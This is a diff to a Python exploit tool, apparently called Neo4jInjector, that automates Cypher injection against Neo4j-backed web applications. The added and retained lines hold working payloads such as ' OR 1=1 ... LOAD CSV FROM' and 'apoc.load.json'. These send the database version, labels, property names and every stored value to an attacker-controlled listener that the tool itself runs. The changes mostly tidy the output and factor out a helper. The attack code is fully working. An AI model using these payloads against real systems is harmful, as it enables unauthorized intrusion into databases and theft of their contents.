@@ -52,8 +52,6 @@ def write_json_to_file(json_data, filename="output.json"):
     file_path = os.path.join(output_dir, filename)
     with open(file_path, 'w') as file:
         file.write(json_data)
-    
-    print(f"JSON data has been written to {file_path}")
 
 def json_to_table(json_data):
     """
@@ -78,6 +76,25 @@ def json_to_table(json_data):
     # Generate and print the table
     print(tabulate(table_data, headers=headers, tablefmt="grid"))
 
+
+def convert_properties_to_json(properties_dict):
+    # Decode URIs and split values into lists
+    lists = {k: urllib.parse.unquote(v).split(',') for k, v in properties_dict.items()}
+
+    # Determine the maximum list length to ensure all lists have equal length
+    max_length = max(len(lst) for lst in lists.values())
+
+    # Extend shorter lists with None to match the maximum length
+    for key, lst in lists.items():
+        lists[key] = lst + [None] * (max_length - len(lst))
+
+    # Zip the lists together and create a structured list of dictionaries
+    zipped = zip(*lists.values())
+    values = [[{k: v} for k, v in zip(lists.keys(), values)] for values in zipped]
+    json_result = convert_to_json(values)
+    return json_result
+
+
 # Classes
 class RequestHandler(BaseHTTPRequestHandler):
     """Handles HTTP GET requests."""
@@ -97,11 +114,9 @@ class Listener():
         self.server = HTTPServer(("0.0.0.0", port), RequestHandler)
 
     def start_listener(self):
-        print("Starting listener...")
         self.server.serve_forever()
 
     def stop_listener(self):
-        print("Stopping listener...")
         self.server.shutdown()
 
 class Neo4jInjector:
@@ -146,7 +161,6 @@ class Neo4jInjector:
                 print("302 Redirect, Cookies Expired/Invalid ?")
                 sys.exit()
             elif response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
-                print(f"Payload Injected Successfully: {response.status_code}")
                 return response
         except requests.exceptions.RequestException as e:
             print(f"Error occurred: {e}")
@@ -185,7 +199,7 @@ class Neo4jInjector:
 
     def exfil_data(self):
 
-        print("Enumerating Version")
+        print("\n[*] Version Check [*]")
         self.inject_payload(f" OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")
 
         data = data_queue.get()  # Retrieve the next item from the queue
@@ -197,7 +211,7 @@ class Neo4jInjector:
         json_to_table(json_result)
 
 
-        print("Apoc Check")
+        print("\n[*] APOC Check [*]")
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL apoc.load.json('{self.exfil_ip}/?apoc_installed=True') YIELD value RETURN value//")
         apoc_installed = True
         if data_queue.empty():
@@ -215,25 +229,22 @@ class Neo4jInjector:
         write_json_to_file(json_result, "apoc_installed.json")
         json_to_table(json_result)
 
-        # if apoc_installed:
-        #     return True
+        if apoc_installed:
+            return True
 
         # version = parsed_data.get("version")
         # if version.parse(given_version) >= version.parse("5.0"):
         #     print(f"Version {given_version} is greater than or equal to 5.0")
         # else:
         #     print(f"Version {given_version} is less than 5.0")
-
-
-
-        print("Dumping labels count")
+        # dump label count
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 //")
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
         label_count = parsed_data.get('label_count')  # Extract the label value
         
-        print("Dumping Labels")
+        
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
 
         # Store labels
@@ -244,15 +255,14 @@ class Neo4jInjector:
             label_value = parsed_data.get('label')  # Extract the label value
             labels.append(label_value)
 
+        print(f"\navailable labels [{label_count}]:")
         for label in labels:
             print(f"[*] {label}")
 
 
-        label = input(f"Enter label to dump: ")
+        label = input(f"\nEnter label to dump: ")
 
-        # print("Dumping Properties")
-        # self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM '{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
-
+        # Dump property count
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?property_count=' + y as l RETURN 0 as _0 //")
 
 
@@ -260,36 +270,32 @@ class Neo4jInjector:
         parsed_data = extract_query_params(data)  # Use the previously defined function
         property_count = parsed_data.get('property_count')  # Extract the label value
 
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM '{self.exfil_ip}/?' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
+
+        # print("Dumping Properties")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties WITH REDUCE(mergedString = '', value in all_properties | mergedString+value+',') as joinedString  LOAD CSV FROM '{self.exfil_ip}/?keys='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
+
+        data = data_queue.get()
+        parsed_data = extract_query_params(data[0:-1])
+        print(f"\navailable properties [{property_count}]:")
+        properties = parsed_data['keys'].split(',')
+        for pr0perty in properties:
+            print(f"[*] {pr0perty}")
 
 
+        properties_dict = {}
+        for pr0perty in properties:
+            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COLLECT(DISTINCT(x.{pr0perty})) AS {pr0perty}  WITH REDUCE(mergedString = '', value in {pr0perty} | mergedString+value+',') as  joinedString LOAD CSV FROM '{self.exfil_ip}/?{pr0perty}='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
+            data = data_queue.get()
+            parsed_data = extract_query_params(data[0:-1])
+            properties_dict.update(parsed_data)
 
-    
-        parsed_data = extract_query_params(data)
-        print(parsed_data) 
-        values = [] 
-        while not data_queue.empty():
-            pair = []
-            for _ in range(int(property_count)):
-                if not data_queue.empty():
-                    data = data_queue.get()
-                    print(data)
-                    parsed_data = extract_query_params(data)
-                    pair.append(parsed_data)
-                else:
-                    print("Queue does not contain enough items for the last pair.")
-                    break
-            values.append(pair)
-
-
-        print(values)
-        json_result = convert_to_json(values)
-        print(json_result)
-        write_json_to_file(json_result, "data.json")
+        json_result = convert_properties_to_json(properties_dict)
+        print(f"\nLabel: {label}")
+        print(f"[{property_count} columns]")
         json_to_table(json_result)
 
     def apoc_exfil_data(self):
-        print("Inside apoc exfil data")
+        print("\n[*] Using APOC to Exfiltrate [*]")
 
         # dump label count
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l CALL apoc.load.json('{self.exfil_ip}/?label_count='+l) YIELD value RETURN value//")
@@ -305,13 +311,13 @@ class Neo4jInjector:
         # Store labels
         data = data_queue.get()
         parsed_data = extract_query_params(data)
-        print(f"available labels [{label_count}]:")
+        print(f"\navailable labels [{label_count}]:")
         labels = parsed_data['labels'].split(',')
         for label in labels:
             print(f"[*] {label}")
 
 
-        label = input(f"Enter label to dump: ")
+        label = input(f"\nEnter label to dump: ")
 
 
         # dump property count
@@ -322,14 +328,14 @@ class Neo4jInjector:
         parsed_data = extract_query_params(data)  # Use the previously defined function
         property_count = parsed_data.get('property_count')  # Extract the label value
 
-        print(property_count)
+        
 
         # print("Dumping Properties")
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties CALL apoc.load.json('{self.exfil_ip}/?keys=' + apoc.text.join(all_properties,',')) YIELD value RETURN value//")
 
         data = data_queue.get()
         parsed_data = extract_query_params(data)
-        print(f"available properties [{property_count}]:")
+        print(f"\navailable properties [{property_count}]:")
         properties = parsed_data['keys'].split(',')
         for pr0perty in properties:
             print(f"[*] {pr0perty}")
@@ -342,24 +348,12 @@ class Neo4jInjector:
             parsed_data = extract_query_params(data)
             properties_dict.update(parsed_data)
 
-        print(properties_dict)
-        lists = {k: urllib.parse.unquote(v).split(',') for k, v in properties_dict.items()}
+        json_result = convert_properties_to_json(properties_dict)
+        print(f"\nLabel: {label}")
+        print(f"[{property_count} columns]")
+        json_to_table(json_result)       
 
-        # take into account if some properties are NONE
-        max_length = max(len(lst) for lst in lists.values())
 
-        for key, lst in lists.items():
-            lists[key] = lst + [None] * (max_length - len(lst))
-
-        print(lists)
-        
-        zipped = zip(*lists.values())
-
-        values = [[{k: v} for k, v in zip(lists.keys(), values)] for values in zipped]
-
-        json_result = convert_to_json(values)
-        write_json_to_file(json_result, "data.json")
-        json_to_table(json_result)
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
